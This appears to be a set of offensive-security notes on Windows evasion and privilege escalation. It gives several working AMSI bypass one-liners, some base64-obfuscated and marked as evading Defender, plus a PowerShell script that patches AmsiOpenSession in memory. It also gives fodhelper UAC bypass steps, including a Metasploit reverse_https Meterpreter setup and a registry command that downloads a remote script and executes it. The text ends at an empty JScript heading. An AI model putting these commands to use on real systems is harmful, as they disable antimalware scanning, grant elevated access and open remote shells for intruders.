#

# Bypassing AMSI with reflection in PowerShell
```powershell
# Run to check if AMSI is running
'amsiutils'
# Basic (Blocked)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
# Loop GetTypes method (Blocked)
$a=[Ref].Assembly.GetTypes()
Foreach($b in $a){if ($b.Name -like "*iUtils*") {$c=$b}}
$d=$c.GetFields('NonPublic,Static')
Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}}
$g=$f.GetValue($null)
[IntPtr]$ptr=$g
[Int32[]]$buf=@(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
# Loop GetTypes method one liner (Blocked)
$a=[Ref].Assembly.GetTypes();Foreach($b in $a){if ($b.Name -like "*iUtils*") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
# Loop GetTypes method one liner obfuscated with ISE Steriods (Working)
${/=\/=\_/===\_/\/=}=[Ref].Assembly.GetTypes();Foreach(${/==\/\______/\_/=} in ${/=\/=\_/===\_/\/=}){if (${/==\/\______/\_/=}.Name -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBpAFUAdABpAGwAcwAqAA==')))) {${/=\__/\______/===}=${/==\/\______/\_/=}}};${/\_____/=\/=====\}=${/=\__/\______/===}.GetFields($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA='))));Foreach(${__/\___/\/\____/=} in ${/\_____/=\/=====\}) {if (${__/\___/\/\____/=}.Name -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBDAG8AbgB0AGUAeAB0AA==')))) {${_/\_/\___/\/===\_}=${__/\___/\/\____/=}}};${__/\_/\__/===\_/\}=${_/\_/\___/\/===\_}.GetValue($null);[IntPtr]${_/===\__/\/\___/\}=${__/\_/\__/===\_/\};[Int32[]]${_/\__/\/\_/==\___}=@(0);[System.Runtime.InteropServices.Marshal]::Copy(${_/\__/\/\_/==\___}, 0, ${_/===\__/\/\___/\}, 1)
# Attacking Initialization (Blocked)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
# Attacking Initialization (Working)
[Ref].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA==')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=')))).SetValue($null,$true)
```
# Wrecking AMSI in PowerShell
```powershell
function LookupFunc {

    Param ($moduleName, $functionName)

    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,@($moduleName)), $functionName))
}

function getDelegateType {

    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
)
    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
      [System.MulticastDelegate])

    $type.
      DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
        SetImplementationFlags('Runtime, Managed')

    $type.
      DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
        SetImplementationFlags('Runtime, Managed')

    return $type.CreateType()
}

[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
$buf = [Byte[]] (0x48, 0x31, 0xC0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
```
## UAC Bypass vs Microsoft Defender
### FODHELPER UAC BYPASS
#### Manual POC
| Info | Command |
|:-----|:--------|
| 1. Create registry path | `New-Item -Path HKCU:\Software\Classes\mssettings\shell\open\command -Value powershell.exe â€“Force` |
| 2. Create DelegateExecute value | `New-ItemProperty -Path HKCU:\Software\Classes\mssettings\shell\open\command -Name DelegateExecute -PropertyType String -Force` |
| 3. Launch a high-integrity PowerShell prompt with fodhelper.exe | `C:\Windows\System32\fodhelper.exe` |

#### Metasploit Example
| Info | Command |
|:-----|:--------|
| 1. Use Shellcode runner to obtain Meterpreter Shell | |
| 2. Launch fodhelper UAC bypass module | `use exploit/windows/local/bypassuac_fodhelper` |
| 3. Select correct target | `show targets; set target 1` |
| 4. List active sessions | `sessions -l` |
| 5. Set the session | `set session 1` |
| 6. Set the payload | `set payload windows/x64/meterpreter/reverse_https` |
| 7. Set Lhost | `set lhost 192.168.3.3` |
| 8. Set Lport | `set lport 444` |
| 9. Run exploit | `run` |

### Improving Fodhelper
| Info | Command |
|:-----|:--------|
| 1. Create registry path | `New-Item -Path HKCU:\Software\Classes\mssettings\shell\open\command -Value "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.txt') | IEX" -Force` |
| 2. Create DelegateExecute value | `New-ItemProperty -Path HKCU:\Software\Classes\mssettings\shell\open\command -Name DelegateExecute -PropertyType String -Force` | 
| 3. Launch a high-integrity PowerShell prompt with fodhelper.exe | `C:\Windows\System32\fodhelper.exe` |

set EnableStageEncoding true
set StageEncoder x64/zutto_dekiru
run

## Bypassing AMSI in JScript
